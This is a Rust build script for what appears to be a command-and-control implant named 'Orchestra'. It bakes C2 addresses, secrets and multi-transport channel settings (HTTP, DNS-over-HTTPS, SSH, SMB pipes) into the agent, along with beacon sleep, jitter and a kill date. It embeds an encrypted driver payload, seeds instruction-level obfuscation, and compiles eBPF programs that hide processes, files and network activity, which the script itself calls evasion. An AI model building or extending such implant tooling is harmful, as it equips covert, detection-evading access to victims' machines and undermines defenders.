//! Build script: generates per-build ORCHESTRA_KEY and ORCHESTRA_NONCE.
//!
//! If the operator has set ORCHESTRA_KEY in the environment, that value is
//! used and re-exported.  Otherwise, a fresh random 32-byte key is generated
//! per build.  ORCHESTRA_NONCE is always auto-generated (12 bytes) unless
//! explicitly set — the nonce must never repeat for the same key, so it must
//! be different per build even when the key is pinned for reproducibility.
//!
//! Both values are emitted as `cargo:rustc-env=...` so stub.rs can read them
//! at compile time via `option_env!()`.

use std::time::{SystemTime, UNIX_EPOCH};

const SM64_GAMMA: u64 = 0x9E3779B97F4A7C15;
const SM64_MUL1: u64 = 0xBF58476D1CE4E5B9;
const SM64_MUL2: u64 = 0x94D049BB133111EB;

#[inline]
fn splitmix64(state: &mut u64) -> u64 {
    *state = state.wrapping_add(SM64_GAMMA);
    let mut z = *state;
    z = (z ^ (z >> 30)).wrapping_mul(SM64_MUL1);
    z = (z ^ (z >> 27)).wrapping_mul(SM64_MUL2);
    z ^ (z >> 31)
}

fn thread_id_u64() -> u64 {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};

    let mut h = DefaultHasher::new();
    std::thread::current().id().hash(&mut h);
    h.finish()
}

fn harvest_entropy() -> [u8; 64] {
    let now_nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let pid = std::process::id() as u64;
    let tid = thread_id_u64();
    let stack_probe = 0u64;
    let stack_addr = (&stack_probe as *const u64 as usize) as u64;

    let mut words = Vec::with_capacity(16);
    words.push(now_nanos as u64);
    words.push((now_nanos >> 64) as u64);
    words.push(pid);
    words.push(tid);
    words.push(stack_addr);

    #[cfg(any(target_os = "linux", target_os = "macos"))]
    {
        use std::io::Read;

        if let Ok(mut f) = std::fs::File::open("/dev/urandom") {
            let mut buf = [0u8; 32];
            if f.read_exact(&mut buf).is_ok() {
                for chunk in buf.chunks_exact(8) {
                    words.push(u64::from_le_bytes(chunk.try_into().unwrap()));
                }
            }
        }
    }

    #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
    {
        if std::is_x86_feature_detected!("rdrand") {
            unsafe {
                let mut hw = 0u64;
                if std::arch::x86_64::_rdrand64_step(&mut hw) == 1 {
                    words.push(hw);
                }
            }
        }
    }

    let mut state = 0x6A09E667F3BCC909u64;
    for w in words {
        state = state.wrapping_add(SM64_GAMMA);
        state ^= w;
    }

    let mut out = [0u8; 64];
    for chunk in out.chunks_mut(8) {
        let v = splitmix64(&mut state).to_le_bytes();
        chunk.copy_from_slice(&v[..chunk.len()]);
    }
    out
}

struct Xoshiro256PlusPlus {
    s: [u64; 4],
}

impl Xoshiro256PlusPlus {
    fn from_seed(seed: [u8; 64]) -> Self {
        let mut sm_state = u64::from_le_bytes(seed[0..8].try_into().unwrap());
        let mut s = [
            splitmix64(&mut sm_state),
            splitmix64(&mut sm_state),
            splitmix64(&mut sm_state),
            splitmix64(&mut sm_state),
        ];
        if s.iter().all(|&x| x == 0) {
            s[0] = 1;
        }
        Self { s }
    }

    fn next_u64(&mut self) -> u64 {
        let result = self.s[0]
            .wrapping_add(self.s[3])
            .rotate_left(23)
            .wrapping_add(self.s[0]);
        let t = self.s[1] << 17;
        self.s[2] ^= self.s[0];
        self.s[3] ^= self.s[1];
        self.s[1] ^= self.s[2];
        self.s[0] ^= self.s[3];
        self.s[2] ^= t;
        self.s[3] = self.s[3].rotate_left(45);
        result
    }

    fn fill_bytes(&mut self, out: &mut [u8]) {
        for chunk in out.chunks_mut(8) {
            let v = self.next_u64().to_le_bytes();
            chunk.copy_from_slice(&v[..chunk.len()]);
        }
    }
}

fn make_rng() -> Xoshiro256PlusPlus {
    let seed = harvest_entropy();
    assert!(
        seed.iter().any(|&b| b != 0),
        "harvest_entropy returned an all-zero seed; aborting build"
    );
    Xoshiro256PlusPlus::from_seed(seed)
}

fn forward_trimmed_env(source: &str, target: &str) {
    if let Ok(value) = std::env::var(source) {
        if !value.trim().is_empty() {
            println!("cargo:rustc-env={}={}", target, value.trim());
        }
    }
}

fn configured_driver_path() -> Option<String> {
    std::env::var("SYS_DRIVER_PATH")
        .ok()
        .filter(|v| !v.trim().is_empty())
        .or_else(|| {
            std::env::var("ORCHESTRA_DRIVER_PATH")
                .ok()
                .filter(|v| !v.trim().is_empty())
        })
        .map(|v| v.trim().to_string())
}

fn validate_embedded_driver_path(path: &str) -> std::path::PathBuf {
    let manifest_dir = std::path::PathBuf::from(
        std::env::var("CARGO_MANIFEST_DIR").expect("CARGO_MANIFEST_DIR is set by cargo"),
    );
    let raw_path = std::path::PathBuf::from(path);
    let resolved = if raw_path.is_absolute() {
        raw_path
    } else {
        manifest_dir.join(raw_path)
    };

    let driver_bytes = std::fs::read(&resolved).unwrap_or_else(|e| {
        panic!(
            "embedded_driver requires SYS_DRIVER_PATH or ORCHESTRA_DRIVER_PATH to point to a readable XOR-encrypted driver file: {} ({e})",
            resolved.display()
        )
    });
    assert!(
        !driver_bytes.is_empty(),
        "embedded_driver driver payload is empty: {}",
        resolved.display()
    );

    let placeholder_path = manifest_dir.join("resources/placeholder_driver.xor");
    if let Ok(placeholder_bytes) = std::fs::read(&placeholder_path) {
        assert!(
            driver_bytes != placeholder_bytes,
            "embedded_driver cannot use the placeholder driver payload: {}",
            resolved.display()
        );
    }

    resolved
}

fn main() {
    println!("cargo:rerun-if-env-changed=ORCHESTRA_KEY");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_NONCE");
    println!("cargo:rerun-if-env-changed=CODE_TRANSFORM_SEED");
    println!("cargo:rerun-if-env-changed=SYS_DRIVER_PATH");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_DRIVER_PATH");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_C_ADDR");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_C_SECRET");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_C_CERT_FP");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_TRANSPORT");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_HTTP_ENDPOINT");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_HTTP_HOST_HEADER");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_DOH_SERVER_URL");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_DOH_DOMAIN");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_SSH_HOST");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_SSH_PORT");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_SSH_USERNAME");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_SSH_AUTH_JSON");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_SSH_HOST_KEY_FP");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_SMB_PIPE_HOST");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_SMB_PIPE_NAME");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_SMB_PIPE_MODE");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_SMB_TCP_RELAY_PORT");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_MODULE_AES_KEY");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_SLEEP_MS");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_JITTER");
    println!("cargo:rerun-if-env-changed=ORCHESTRA_KILL_DATE");
    println!("cargo:rustc-check-cfg=cfg(has_sys_driver_path)");

    // ── C2 address / secret / cert fingerprint baking ───────────────────────
    // The Builder sets ORCHESTRA_C_ADDR, ORCHESTRA_C_SECRET, and
    // ORCHESTRA_C_CERT_FP.  Forward them to the compile-time env vars that
    // the agent sources (SYS_C_ADDR, SYS_C_SECRET, SYS_C_CERT_FP).
    if let Ok(addr) = std::env::var("ORCHESTRA_C_ADDR") {
        if !addr.trim().is_empty() {
            println!("cargo:rustc-env=SYS_C_ADDR={}", addr.trim());
        }
    }
    if let Ok(secret) = std::env::var("ORCHESTRA_C_SECRET") {
        if !secret.trim().is_empty() {
            println!("cargo:rustc-env=SYS_C_SECRET={}", secret.trim());
        }
    }
    if let Ok(fp) = std::env::var("ORCHESTRA_C_CERT_FP") {
        if !fp.trim().is_empty() {
            println!("cargo:rustc-env=SYS_C_CERT_FP={}", fp.trim());
        }
    }
    forward_trimmed_env("ORCHESTRA_TRANSPORT", "SYS_TRANSPORT");
    forward_trimmed_env("ORCHESTRA_HTTP_ENDPOINT", "SYS_HTTP_ENDPOINT");
    forward_trimmed_env("ORCHESTRA_HTTP_HOST_HEADER", "SYS_HTTP_HOST_HEADER");
    forward_trimmed_env("ORCHESTRA_DOH_SERVER_URL", "SYS_DOH_SERVER_URL");
    forward_trimmed_env("ORCHESTRA_DOH_DOMAIN", "SYS_DOH_DOMAIN");
    forward_trimmed_env("ORCHESTRA_SSH_HOST", "SYS_SSH_HOST");
    forward_trimmed_env("ORCHESTRA_SSH_PORT", "SYS_SSH_PORT");
    forward_trimmed_env("ORCHESTRA_SSH_USERNAME", "SYS_SSH_USERNAME");
    forward_trimmed_env("ORCHESTRA_SSH_AUTH_JSON", "SYS_SSH_AUTH_JSON");
    forward_trimmed_env("ORCHESTRA_SSH_HOST_KEY_FP", "SYS_SSH_HOST_KEY_FP");
    forward_trimmed_env("ORCHESTRA_SMB_PIPE_HOST", "SYS_SMB_PIPE_HOST");
    forward_trimmed_env("ORCHESTRA_SMB_PIPE_NAME", "SYS_SMB_PIPE_NAME");
    forward_trimmed_env("ORCHESTRA_SMB_PIPE_MODE", "SYS_SMB_PIPE_MODE");
    forward_trimmed_env("ORCHESTRA_SMB_TCP_RELAY_PORT", "SYS_SMB_TCP_RELAY_PORT");
    // ── Module AES key baking ─────────────────────────────────────────────────
    // When the server-side build injects ORCHESTRA_MODULE_AES_KEY, bake it in
    // so the agent doesn't require an agent.toml at runtime for module loading.
    if let Ok(module_key) = std::env::var("ORCHESTRA_MODULE_AES_KEY") {
        if !module_key.trim().is_empty() {
            println!("cargo:rustc-env=SYS_MODULE_KEY={}", module_key.trim());
        }
    }

    // ── Agent behavior settings ─────────────────────────────────────────────
    // Server-side build requests use these fields to produce self-contained
    // agents whose timing and kill date do not depend on agent.toml being
    // present on the target host.
    if let Ok(sleep_ms) = std::env::var("ORCHESTRA_SLEEP_MS") {
        if !sleep_ms.trim().is_empty() {
            println!("cargo:rustc-env=SYS_SLEEP_MS={}", sleep_ms.trim());
        }
    }
    if let Ok(jitter) = std::env::var("ORCHESTRA_JITTER") {
        if !jitter.trim().is_empty() {
            println!("cargo:rustc-env=SYS_JITTER={}", jitter.trim());
        }
    }
    if let Ok(kill_date) = std::env::var("ORCHESTRA_KILL_DATE") {
        if !kill_date.trim().is_empty() {
            println!("cargo:rustc-env=SYS_KILL_DATE={}", kill_date.trim());
        }
    }

    // Optional embedded driver path wiring for `embedded_driver` builds.
    // When the feature is enabled, fail at build time unless a real payload is
    // provided so runtime deployment never silently falls back to placeholders.
    let configured_driver_path = configured_driver_path();
    if std::env::var_os("CARGO_FEATURE_EMBEDDED_DRIVER").is_some()
        && configured_driver_path.is_none()
    {
        panic!(
            "embedded_driver requires SYS_DRIVER_PATH or ORCHESTRA_DRIVER_PATH to point to an XOR-encrypted driver file"
        );
    }

    if let Some(path) = configured_driver_path {
        let resolved = validate_embedded_driver_path(&path);
        println!("cargo:rerun-if-changed={}", resolved.display());
        println!("cargo:rustc-env=SYS_DRIVER_PATH={}", resolved.display());
        println!("cargo:rustc-cfg=has_sys_driver_path");
    }

    // ── CODE_TRANSFORM_SEED ─────────────────────────────────────────────────
    // Used by the `#[code_transform]` attribute macro to drive the
    // instruction-substitution and basic-block reordering passes.
    // If the operator sets CODE_TRANSFORM_SEED explicitly the same binary is
    // produced on every build (reproducible); otherwise a fresh seed is
    // derived from the same entropy pool used for ORCHESTRA_KEY.
    if std::env::var("CODE_TRANSFORM_SEED").is_err() {
        let mut rng = make_rng();
        let seed = rng.next_u64();
        println!("cargo:rustc-env=CODE_TRANSFORM_SEED={}", seed);
    }

    // ── ORCHESTRA_KEY (32 bytes = 64 hex chars) ────────────────────────────
    if std::env::var("ORCHESTRA_KEY").is_err() {
        let mut rng = make_rng();
        let mut key = [0u8; 32];
        rng.fill_bytes(&mut key);
        let hex: String = key.iter().map(|b| format!("{:02x}", b)).collect();
        println!("cargo:rustc-env=ORCHESTRA_KEY={}", hex);
    }

    // ── ORCHESTRA_NONCE (12 bytes = 24 hex chars) ──────────────────────────
    // Always auto-generate unless explicitly set.  Even when the operator
    // pins ORCHESTRA_KEY for reproducibility, the nonce MUST change per
    // build — ChaCha20 with the same key+nonce pair leaks the keystream.
    // Operators who need bit-for-bit reproducible builds should set both
    // env vars explicitly (C-6 fix).
    if std::env::var("ORCHESTRA_NONCE").is_err() {
        let mut rng = make_rng();
        let mut nonce = [0u8; 12];
        rng.fill_bytes(&mut nonce);
        let hex: String = nonce.iter().map(|b| format!("{:02x}", b)).collect();
        println!("cargo:rustc-env=ORCHESTRA_NONCE={}", hex);
    }

    // ── eBPF program compilation (ebpf feature) ─────────────────────────
    // When the `ebpf` feature is enabled, compile eBPF C sources to BPF
    // bytecode using `clang -target bpf`.  If clang is not available, emit
    // empty placeholder byte arrays and log a warning — the agent will
    // gracefully degrade at runtime.
    if std::env::var_os("CARGO_FEATURE_EBPF").is_some() {
        compile_ebpf_programs();
    }
}

/// Compile eBPF C sources (`.bpf.c`) in `ebpf/` to BPF ELF objects (`.o`),
/// then emit each as a `cargo:rustc-env=EBPF_<NAME>=<hex>` environment
/// variable so the Rust module can embed the bytecode at compile time.
///
/// Requires `clang` on `$PATH`.  If `clang` is not found the build still
/// succeeds — the embedded byte arrays will be empty and the agent will
/// skip eBPF loading at runtime (graceful degradation).
fn compile_ebpf_programs() {
    let manifest_dir = std::path::PathBuf::from(
        std::env::var("CARGO_MANIFEST_DIR").expect("CARGO_MANIFEST_DIR set by cargo"),
    );
    let ebpf_dir = manifest_dir.join("ebpf");

    // Detect clang — try `clang` first, then versioned names.
    let clang = which_clang();
    if clang.is_none() {
        eprintln!(
            "warning: clang not found; eBPF programs will not be compiled. \
             Install clang for eBPF evasion support."
        );
        emit_empty_ebpf_env();
        return;
    }
    let clang = clang.unwrap();

    let out_dir = std::path::PathBuf::from(
        std::env::var("OUT_DIR").expect("OUT_DIR set by cargo"),
    );
    let ebpf_out = out_dir.join("ebpf");
    std::fs::create_dir_all(&ebpf_out)
        .expect("failed to create eBPF output directory");

    let programs = [
        "hide_process",
        "hide_files",
        "hide_network",
    ];

    let include_dir = ebpf_dir.clone(); // .bpf.c files are in ebpf/

    for prog_name in &programs {
        let src = ebpf_dir.join(format!("{}.bpf.c", prog_name));
        let obj = ebpf_out.join(format!("{}.o", prog_name));

        if !src.exists() {
            eprintln!(
                "warning: eBPF source {} not found; skipping",
                src.display()
            );
            emit_empty_ebpf_program(prog_name);
            continue;
        }

        println!("cargo:rerun-if-changed={}", src.display());

        // clang -target bpf -O2 -g -c -I <include> -o <obj> <src>
        let status = std::process::Command::new(&clang)
            .arg("-target")
            .arg("bpf")
            .arg("-O2")
            .arg("-g")
            .arg("-c")
            .arg("-I")
            .arg(&include_dir)
            .arg("-o")
            .arg(&obj)
            .arg(&src)
            .status()
            .expect("failed to execute clang");

        if !status.success() {
            eprintln!(
                "warning: clang failed to compile {} ; eBPF program will be empty",
                src.display()
            );
            emit_empty_ebpf_program(prog_name);
            continue;
        }

        // Read the compiled object and emit as hex-encoded env var.
        let bytes = std::fs::read(&obj).unwrap_or_else(|e| {
            panic!("failed to read compiled eBPF object {}: {e}", obj.display())
        });
        let hex: String = bytes.iter().map(|b| format!("{:02x}", b)).collect();
        let env_name = format!("EBPF_{}", prog_name.to_uppercase());
        println!("cargo:rustc-env={}={}", env_name, hex);
    }
}

/// Try to find a suitable clang binary on PATH.
fn which_clang() -> Option<String> {
    let candidates = ["clang", "clang-17", "clang-16", "clang-15", "clang-14"];
    for candidate in &candidates {
        if std::process::Command::new(candidate)
            .arg("--version")
            .output()
            .is_ok()
        {
            return Some(candidate.to_string());
        }
    }
    None
}

/// Emit empty byte arrays for all eBPF programs (graceful degradation).
fn emit_empty_ebpf_env() {
    let programs = ["hide_process", "hide_files", "hide_network"];
    for prog_name in &programs {
        emit_empty_ebpf_program(prog_name);
    }
}

/// Emit an empty byte array for a single eBPF program.
fn emit_empty_ebpf_program(name: &str) {
    let env_name = format!("EBPF_{}", name.to_uppercase());
    println!("cargo:rustc-env={}=", env_name); // empty = no bytecode
}
